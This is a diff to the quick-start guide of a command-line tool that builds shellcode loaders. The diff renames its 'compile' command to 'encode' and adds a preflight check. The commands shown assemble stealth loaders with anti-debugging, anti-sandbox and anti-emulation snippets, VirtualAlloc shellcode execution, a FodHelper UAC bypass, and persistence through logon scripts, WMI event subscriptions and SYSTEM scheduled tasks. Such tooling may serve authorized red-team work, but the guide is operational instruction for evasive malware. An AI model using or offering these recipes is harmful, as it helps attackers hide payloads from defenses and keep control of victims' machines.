@@ -2,23 +2,33 @@
 
 Walk through your first shellcode loader build with the CLI.
 
-## Compile a loader
+## Preflight first
+
+Before your first build, confirm every external tool is ready:
+
+```powershell
+washmachine-cli doctor
+```
+
+You want four `OK` rows. If anything is missing, [troubleshooting](/guide/troubleshooting) tells you exactly how to fix each row.
+
+## Encode a loader
 
 ```powershell
 # Minimal loader from a shellcode file
-washmachine-cli compile -s payload.bin
+washmachine-cli encode -s payload.bin
 
 # Full-featured loader with the default template
-washmachine-cli compile -s payload.bin -t default
+washmachine-cli encode -s payload.bin -t default
 
 # Stealth loader with encoding and envelope
-washmachine-cli compile -s payload.bin -t stealth -e 1 -v 2
+washmachine-cli encode -s payload.bin -t stealth -e 1 -v 2
 
 # Compile from inline hex
-washmachine-cli compile --shellcode-hex FC4883E4F0...
+washmachine-cli encode --shellcode-hex FC4883E4F0...
 
 # JSON output for CI/CD pipelines
-washmachine-cli compile -s payload.bin --json
+washmachine-cli encode -s payload.bin --json
 ```
 
 ## Selecting snippets
@@ -27,30 +37,30 @@ Each template has placeholders for snippet sections (anti-debugging, evasion, in
 
 ```powershell
 # Use a specific anti-emulation technique
-washmachine-cli compile -s payload.bin --snippet antiemulation=SirAllocALot
+washmachine-cli encode -s payload.bin --snippet antiemulation=SirAllocALot
 
 # Combine multiple snippet overrides
-washmachine-cli compile -s payload.bin -t default \
+washmachine-cli encode -s payload.bin -t default \
   --snippet antisandbox=Default \
   --snippet antidebugging=IsDebuggerPresent \
   --snippet shellcodeexecution=VirtualAlloc
 
 # Add user-level persistence (no admin required)
-washmachine-cli compile -s payload.bin -t default \
+washmachine-cli encode -s payload.bin -t default \
   --snippet persistence=LogonScript
 
 # Add admin persistence — must also select a UAC bypass
-washmachine-cli compile -s payload.bin -t default \
+washmachine-cli encode -s payload.bin -t default \
   --snippet uacb=FodHelper \
   --snippet persistence=WmiEventSubscription
 
 # Boot-time SYSTEM execution via scheduled task
-washmachine-cli compile -s payload.bin -t default \
+washmachine-cli encode -s payload.bin -t default \
   --snippet uacb=FodHelper \
   --snippet persistence=SchtasksSystem
 ```
 
-Run `washmachine-cli list snippets` to see all available sections and item IDs.
+Run `washmachine-cli show modules` to see all available sections and item IDs.
 
 ## Analyze a PE file
 
